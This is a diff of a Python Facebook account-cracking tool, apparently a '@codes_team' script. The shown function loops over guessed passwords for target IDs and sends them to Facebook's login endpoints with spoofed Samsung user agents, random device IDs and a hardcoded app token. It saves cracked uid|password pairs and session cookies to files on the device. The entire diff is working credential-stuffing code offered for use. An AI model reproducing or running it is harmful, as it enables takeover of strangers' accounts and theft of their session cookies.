@@ -953,47 +953,103 @@ def m1(idf,pwv):
         except requests.exceptions.ConnectionError:
             time.sleep(31)
     loop+=1
-
+fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
+xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
 def m2(idf,pwv):
- global loop,ok,cp
- animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
- sys.stdout.write(f'\r{P} [{animasi}-{H}M2{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
- sys.stdout.flush()
- ses = requests.Session()
- ua = random.choice(usragent)
- ua2 = random.choice(usragent)
- for pw in pwv:
-  try:
-   ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-   p = ses.get('https://m.facebook.com/') 
-   dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
-   koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-   koki+=' m_pixel_ratio=2.625; wd=412x756'
-   heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-   po = ses.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-   if "checkpoint" in po.cookies.get_dict().keys():
-        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-        if 'y' in cp_xdx:
-         print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
-        open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
-        cp+=1
-        break
-   elif "c_user" in ses.cookies.get_dict().keys():
-        ok+=1
-        coki=po.cookies.get_dict()
-        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-        idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{P} [{H}ATOM-OK{P}] {GREEN}{idf}|{pw}{xxx}')
-        if 'y' in cokix:
-         print(f'\r{gen}{H}'+kuki)
-        open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
-        break
-        
-   else:
-        continue
-  except requests.exceptions.ConnectionError:
-      waktu(31)
- loop+=1
+        global loop,oks,lim
+        p=round(loop*100/lim,2)
+                
+        sys.stdout.write('\r\r\033[1;37m [@codes_team] [%s] \033[1;37m[OK=%s] [%s%%] \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
+        try:
+                for pas in pwv:
+                        application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
+                        application_version_code=str(random.randint(000000000,999999999))
+                        fbs=random.choice(fbks)
+                        gtt=random.choice(xxxxx)
+                        gttt=random.choice(xxxxx)
+                        android_version=str(random.randrange(6,13))
+                        ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                        device_id = str(uuid.uuid4())
+                        adid = str(uuid.uuid4())
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device':gtt,
+                                'device_id':adid,
+                                'email':idf,
+                                'password':pas,
+                                "logged_out_id": str(uuid.uuid4()),
+                                "hash_id": str(uuid.uuid4()),
+                                "reg_instance": str(uuid.uuid4()),
+                                "session_id": str(uuid.uuid4()),
+                                "advertiser_id": str(uuid.uuid4()),
+                                'generate_analytics_claims':'1',
+                                'credentials_type':'password',
+                                'source':'login',
+                                "sim_country": "id",
+                                "network_country": "id",
+                                "relative_url": "method/auth.login",
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                "locale":"en_US","client_country_code":"US",
+                                'fb_api_req_friendly_name':'authenticate',
+                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                        }
+                        #print(data)
+                        accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+                        headers={
+                                    "method": 'GET', 
+    "path": '/',
+    "scheme": 'https', 
+    "authority": 'p.facebook.com',
+    "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    "accept-language": 'en-US,en;q=0.9',
+    "cache-control": 'max-age=0',
+    "sec-ch-ua": '"Chromium";v="111", "Not(A:Brand";v="8"',
+    "sec-ch-ua-mobile": '?1',
+    "sec-ch-ua-platform": '"Android"',
+    "sec-fetch-dest": 'document',
+    "sec-fetch-mode": 'navigate',
+    "sec-fetch-site": 'none',
+    "sec-fetch-user": '?1',
+    "upgrade-insecure-requests": '1',
+    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
+}
+                        url = 'https://p.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        #print(po)
+                        if 'session_key' in po:
+                                try:
+                                        uid = po['uid']
+                                except:
+                                        uid = ids
+                                if str(uid) in oks:
+                                        break
+                                else:
+                                        print('\r\r\033[1;32m [@codes_team-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        open('/sdcard/@codes_team-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/@codes_team_OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        oks.append(str(uid))
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                try:
+                                        uid = po['error']['error_data']['uid']
+                                except:
+                                        uid = ids
+                                if uid in oks:pass
+                                else:
+                                        print('\r\r\x1b[38;5;208m [@codes_team-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/@codes_team-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        cps.append(str(ids))
+                                        break
+                        else:continue
+                loop+=1
+        except Exception as e:
+                pass
 
 
 def m3(idf,pwv):
